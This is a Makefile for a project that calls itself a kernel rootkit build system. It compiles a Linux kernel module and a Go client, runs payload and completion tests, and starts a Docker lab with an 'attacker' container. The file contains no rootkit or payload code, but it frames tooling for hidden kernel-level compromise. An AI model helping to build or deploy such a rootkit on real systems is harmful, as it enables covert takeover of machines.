.PHONY: all kernel client test test-go test-payloads test-completions test-integration docker-build docker-up docker-down clean

all: kernel client

# Build kernel module (requires GCC + kernel headers on native Linux)
kernel:
	$(MAKE) -C src

# Build Go client
client:
	cd client/go && go build -ldflags="-s -w" -o vault_kernel ./cmd/vault_kernel/
	@echo "[+] Go client: client/go/vault_kernel"

# Run Go unit tests
test-go:
	cd client/go && go test ./... -v -count=1

# Run payload regression tests (no root, no kernel needed)
test-payloads:
	bash tests/test_payloads.sh

# Run bash-completion tests (no root, no kernel, no bash-completion pkg)
test-completions:
	bash tests/test_completions.sh

# Run integration tests (requires VM with loaded kernel module)
test-integration:
	@echo "[!] Integration tests require a native Linux VM with the kernel module loaded."
	@echo "    Run: sudo bash tests/integration.sh"

# All tests (unit + payloads + completions; integration stays VM-only)
test: test-go test-payloads test-completions
	@echo "[*] Unit, payload and completion tests passed."
	@echo "[!] For integration tests, run on a VM: sudo bash tests/integration.sh"

# Docker operations
docker-build:
	bash docker/test.sh build

docker-up:
	bash docker/test.sh up

docker-down:
	bash docker/test.sh down

docker-test: docker-build docker-up
	@echo "[*] Environment ready for manual testing."
	@echo "    docker exec -it vault_kernel-attacker bash"

# Clean
clean:
	$(MAKE) -C src clean
	rm -f client/go/vault_kernel
	rm -rf docker/out/*
	@echo "[+] Cleaned"

# Help
help:
	@echo "vault_kernel — Kernel Rootkit Build System"
	@echo ""
	@echo "Targets:"
	@echo "  kernel           Build kernel module (requires GCC + kernel headers)"
	@echo "  client           Build Go CLI client"
	@echo "  test             Run Go unit tests + payload regression + completion tests (no root, no VM)"
	@echo "  test-go          Run Go unit tests only"
	@echo "  test-payloads    Run payload regression only"
	@echo "  test-completions Run the bash-completion functional test only"
	@echo "  test-integration Run the integration suite (VM with the module loaded)"
	@echo "  docker-build     Build kernel module in Docker"
	@echo "  docker-up        Start multi-node test environment"
	@echo "  docker-down      Tear down test environment"
	@echo "  docker-test      docker-build + docker-up (ready for manual testing)"
	@echo "  clean            Remove build artifacts"
